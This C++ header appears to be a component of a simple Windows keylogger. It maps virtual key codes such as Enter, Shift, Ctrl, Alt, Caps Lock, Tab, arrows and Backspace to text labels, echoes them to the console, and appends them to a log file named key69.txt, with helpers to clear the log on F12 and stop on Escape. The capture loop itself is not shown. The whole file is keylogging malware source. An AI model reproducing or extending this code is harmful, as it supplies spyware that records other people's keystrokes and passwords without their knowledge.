#pragma once
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
using namespace std;

void tofile(string word) {
	ofstream sixnine;
	sixnine.open("key69.txt", ofstream::app);
	sixnine << word;
	sixnine.close();


}

void twofile(char k) {
	ofstream sixnine;
	sixnine.open("key69.txt", ofstream::app);
	sixnine << k;
	sixnine.close();

}

void cfile(void) {
	ofstream sixnine;
	sixnine.open("key69.txt", ofstream::trunc);
	sixnine.close();

}

bool exit(char y) {
	if (y == VK_ESCAPE) {
		return TRUE;
	}else {
		return FALSE;
	}

}

bool clear(char x) {
	if (x == VK_F12) {
		return TRUE;
	}else {
		return FALSE;
	}

}

bool xxx(char i) {
	switch (i)
	{
	case VK_RETURN:
		cout << "\n";
		tofile("\n");
		return TRUE;;
	case VK_SHIFT:
		cout << " Shift ";
		tofile(" Shift ");
		return TRUE;
	case VK_SPACE:
		cout << "  ";
		tofile(" ");
		return TRUE;
	case VK_BACK:
		cout << "\b \b";
		tofile("\b \b");
		return TRUE;
	case VK_CONTROL:
		cout << " CRTL ";
		tofile("CRTL");
		return TRUE;
	case VK_CAPITAL:
		cout << " CAPS ";
		tofile("CAPS");
		return TRUE;
	case VK_MENU:
		cout << " ALT ";
		tofile("ALT");
		return TRUE;
	case VK_LEFT:
		cout << " <= ";
		tofile("<=");
		return TRUE;
	case VK_RIGHT:
		cout << " => ";
		tofile("=>");
		return TRUE;
	case VK_TAB:
		cout << "\t";
		tofile("\t");
		return TRUE;

	default:
		return FALSE;



	}

}